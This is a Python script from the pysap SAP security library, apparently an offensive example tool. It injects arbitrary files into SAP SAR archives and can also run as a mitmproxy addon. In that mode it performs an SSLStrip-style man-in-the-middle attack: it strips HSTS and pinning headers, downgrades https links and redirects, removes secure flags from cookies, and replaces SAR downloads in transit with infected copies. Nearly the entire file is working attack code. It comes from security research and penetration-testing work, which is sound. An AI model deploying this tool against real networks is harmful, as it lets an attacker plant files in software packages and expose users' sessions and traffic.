#!/usr/bin/env python2
# encoding: utf-8
# pysap - Python library for crafting SAP's network protocols packets
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# Author:
#   Martin Gallo (@martingalloar)
#   Code contributed by SecureAuth to the OWASP CBAS project
#

# Standard imports
import re
import logging
from os import unlink
from os.path import exists
from argparse import ArgumentParser
from tempfile import NamedTemporaryFile
# Custom imports
import pysap
from pysap.SAPCAR import SAPCARArchive


def infect_sar_file(sar_filename, inject_files):
    """ Receives a SAR file and infects it by adding new files

    :type sar_filename: string
    :param sar_filename: name of the SAR file to infect

    :type inject_files: list of strings
    :param inject_files: list of files to inject into the SAR file
    """

    sar = SAPCARArchive(sar_filename, "r+")

    # Add each of the files specified as inject files
    for filename, archive_filename in inject_files:
        sar.add_file(filename, archive_filename=archive_filename)

    # Writes the modified file
    sar.write()


# Command line options parser
def parse_options(args=None, req_filename=True):

    description = "This example script can be used to infect a given SAR v2.00 or v2.01 file by means of adding new " \
                  "files to it. Each file to infect is specified by a pair: filename (original filename) and archive "\
                  "filename (the name we want inside the archive). The script can also be used to dynamically infect "\
                  "SAR files being downloaded using mitmproxy. In that case, the scripts takes the files to inject as "\
                  "parameters, performs an SSLStrip-like MitM and when identifies a SAR file that is going to be " \
                  "offered as a download it infects it."

    usage = "%(prog)s [options] "
    if req_filename:
        usage += "-f <sar_filename> "
    usage += "[<filename> <archive filename>]"

    parser = ArgumentParser(usage=usage, description=description, epilog=pysap.epilog)

    target = parser.add_argument_group("Target options")
    target.add_argument("-f", "--sar-filename", dest="sar_filename",
                        help="Filename of the SAR file to infect")

    misc = parser.add_argument_group("Misc options")
    misc.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Verbose output")

    (options, args) = parser.parse_known_args(args)

    if not req_filename:
        args.pop(0)
    elif req_filename and not options.sar_filename:
        parser.error("Must provide a file to infect!")

    if len(args) < 2 or len(args) % 2 != 0:
        parser.error("Invalid number or arguments!")

    inject_files = []
    while args:
        inject_files.append((args.pop(0), args.pop(0)))

    return options, inject_files


# Main function for when called from command-line
def main():
    options, inject_files = parse_options()

    if options.verbose:
        logging.basicConfig(level=logging.DEBUG)

    if not exists(options.sar_filename):
        print("[-] SAR file '%s' doesn't exist!" % options.sar_filename)
        return

    print("[*] Infecting SAR file '%s' with the following files:" % options.sar_filename)
    for (filename, archive_filename) in inject_files:
        if not exists(filename):
            print("[-] File to inject '%s' doesn't exist" % filename)
            return
        print("[*]\t%s\tas\t%s" % (filename, archive_filename))

    infect_sar_file(options.sar_filename, inject_files)


# Mitmproxy start event function
def start(context, argv):
    # set of SSL/TLS capable hosts
    context.secure_hosts = set()

    options, context.inject_files = parse_options(argv, req_filename=False)

    if options.verbose:
        logging.basicConfig(level=logging.DEBUG)

    for (filename, archive_filename) in context.inject_files:
        if not exists(filename):
            raise ValueError("File to inject '%s' doesn't exist" % filename)


# Mitmproxy request event function
def request(context, flow):
    flow.request.headers.pop('If-Modified-Since', None)
    flow.request.headers.pop('Cache-Control', None)

    # Proxy connections to SSL-enabled hosts
    if flow.request.pretty_host in context.secure_hosts:
        flow.request.scheme = 'https'
        flow.request.port = 443


# Mitmproxy response event function
def response(context, flow):
    from netlib.http import decoded

    with decoded(flow.response):
        # Remove HSTS headers
        flow.request.headers.pop('Strict-Transport-Security', None)
        flow.request.headers.pop('Public-Key-Pins', None)

        # Check if the file is a SAR file attachment
        if "content-disposition" in flow.response.headers:
            content_disposition = flow.response.headers.get("content-disposition").lower()
            if content_disposition.startswith("attachment") and content_disposition.endswith(".sar"):
                context.log("SAR file attachment found (%s bytes)" % flow.response.headers["content-length"])
                fil = NamedTemporaryFile(delete=False)
                fil.write(flow.response.content)
                fil.close()
                context.log("SAR file temporally stored as '%s'" % fil.name)

                infect_sar_file(fil.name, context.inject_files)
                context.log("SAR file infected !")

                with open(fil.name, "r") as new_fil:
                    content = new_fil.read()

                flow.response.content = content
                flow.response.headers["content-length"] = str(len(content))
                context.log("Returning infected SAR file (new size %s bytes)" % flow.response.headers["content-length"])

                unlink(fil.name)
                context.log("Removed temporally file '%s'" % fil.name)

        else:
            # Strip links in response body
            flow.response.content = flow.response.content.replace('https://', 'http://')

        # Strip links in 'Location' header
        if flow.response.headers.get('Location', '').startswith('https://'):
            location = flow.response.headers['Location']
            from six.moves import urllib
            hostname = urllib.parse.urlparse(location).hostname
            if hostname:
                context.secure_hosts.add(hostname)
            flow.response.headers['Location'] = location.replace('https://', 'http://', 1)

        # Strip secure flag from 'Set-Cookie' headers
        cookies = flow.response.headers.get_all('Set-Cookie')
        cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
        flow.response.headers.set_all('Set-Cookie', cookies)


if __name__ == "__main__":
    main()
